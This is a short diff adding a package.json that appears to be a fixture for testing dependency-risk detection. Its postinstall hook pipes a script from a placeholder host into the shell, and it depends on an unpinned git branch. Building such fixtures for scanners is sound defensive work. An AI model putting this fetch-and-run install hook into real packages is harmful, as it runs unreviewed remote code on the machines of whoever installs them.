@@ -1,0 +1,10 @@
+{
+  "name": "security-fixture-dependency-risk",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl https://example.invalid/install.sh | sh"
+  },
+  "dependencies": {
+    "example-unpinned": "git+https://example.invalid/repository.git#main"
+  }
+}
